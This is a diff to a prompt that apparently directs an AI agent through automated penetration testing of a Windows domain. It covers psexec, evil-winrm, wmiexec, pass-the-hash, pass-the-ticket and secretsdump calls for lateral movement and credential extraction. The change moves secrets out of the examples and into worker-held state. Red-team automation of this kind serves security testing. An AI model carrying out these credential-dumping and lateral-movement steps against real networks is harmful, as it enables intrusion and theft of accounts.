@@ -42,45 +42,49 @@ Your role is to move through the network and extract credentials from compromise
 
 ### Method Priority Order
 
+> **Credentials.** Call shapes below are principal-only. The worker resolves
+> the password, hash, AES key, or ticket for `(username, domain)` from
+> operation state at dispatch — never include `password`, `hash`,
+> `ticket_path`, `aes_key`, or other secret fields yourself.
+
 1. **psexec** - Most reliable for admins
    - If psexec fails with "access denied", you don't have admin rights on the target
-   - Prefer pass-the-hash when available
+   - Worker auto-selects PTH vs password auth based on what's in state
    ```
-   psexec(target="192.168.58.10", username="admin", hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", domain="contoso.local")
-   psexec(target="192.168.58.10", username="admin", password="P@ssw0rd!", domain="contoso.local")
+   psexec(target="192.168.58.10", username="admin", domain="contoso.local")
    ```
 
 2. **evil-winrm** - Works if WinRM enabled (check 5985/5986 first)
    ```
-   evil_winrm(target="192.168.58.10", username="admin", hash="31d6cfe0d16ae931b73c59d7e0c089c0", domain="contoso.local")
-   evil_winrm(target="192.168.58.10", username="admin", password="P@ssw0rd!", domain="contoso.local")
+   evil_winrm(target="192.168.58.10", username="admin", domain="contoso.local")
    ```
 
 3. **wmi/smbexec** - Alternate methods
    ```
-   wmiexec(target="192.168.58.10", username="admin", hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", domain="contoso.local")
-   smbexec(target="192.168.58.10", username="admin", hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", domain="contoso.local")
+   wmiexec(target="192.168.58.10", username="admin", domain="contoso.local")
+   smbexec(target="192.168.58.10", username="admin", domain="contoso.local")
    ```
 
 ### Pass-the-Hash
-When you have NTLM hash instead of password, use the format `LM:NT` or just `NT`:
+When the worker has only an NTLM hash for the principal, it auto-selects PTH —
+no schema change on your side:
 ```
-psexec(target="dc01.contoso.local", username="administrator", hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", domain="contoso.local")
-evil_winrm(target="dc01.contoso.local", username="administrator", hash="31d6cfe0d16ae931b73c59d7e0c089c0", domain="contoso.local")
-wmiexec(target="dc01.contoso.local", username="administrator", hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", domain="contoso.local")
+psexec(target="dc01.contoso.local", username="administrator", domain="contoso.local")
+evil_winrm(target="dc01.contoso.local", username="administrator", domain="contoso.local")
+wmiexec(target="dc01.contoso.local", username="administrator", domain="contoso.local")
 ```
 
 ### Pass-the-Ticket
-When you have a Kerberos ticket (ccache file), use the `_kerberos` variants:
+When you have a Kerberos ticket (ccache file), use the `_kerberos` variants —
+the worker resolves the most recent ccache for the principal from disk:
 ```
-# If you already have a .ccache file from S4U/delegation/ADCS attack:
-psexec_kerberos(target="dc01.contoso.local", ticket_file="/tmp/administrator.ccache")
-wmiexec_kerberos(target="dc01.contoso.local", ticket_file="/tmp/administrator.ccache")
-secretsdump_kerberos(target="dc01.contoso.local", ticket_file="/tmp/administrator.ccache")
+psexec_kerberos(target="dc01.contoso.local", username="administrator", domain="contoso.local")
+wmiexec_kerberos(target="dc01.contoso.local", username="administrator", domain="contoso.local")
+secretsdump_kerberos(target="dc01.contoso.local", username="administrator", domain="contoso.local")
 
 # If you need to request a TGT first:
-get_tgt(username="admin", hash="31d6cfe0d16ae931b73c59d7e0c089c0", domain="contoso.local")
-# → Creates /tmp/admin.ccache, then use it with the _kerberos tools
+get_tgt(username="admin", domain="contoso.local")
+# → Creates a ccache for admin@contoso.local; subsequent _kerberos tools pick it up.
 ```
 
 Use Kerberos when:
@@ -94,14 +98,11 @@ Use Kerberos when:
 ### Secretsdump (Primary Method)
 After gaining access to a host, **immediately run secretsdump**:
 ```
-# With password:
-secretsdump(target="192.168.58.10", domain="contoso.local", username="admin", password="P@ssw0rd!")
+# Worker auto-selects password / hash / ticket based on what's in state for (username, domain):
+secretsdump(target="192.168.58.10", domain="contoso.local", username="admin")
 
-# With hash (pass-the-hash):
-secretsdump(target="192.168.58.10", domain="contoso.local", username="admin", hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0")
-
-# With Kerberos ticket:
-secretsdump_kerberos(target="dc01.contoso.local", ticket_file="/tmp/administrator.ccache")
+# Force Kerberos ticket auth (worker picks the most recent ccache for the principal):
+secretsdump_kerberos(target="dc01.contoso.local", domain="contoso.local", username="administrator")
 ```
 
 Extracts:
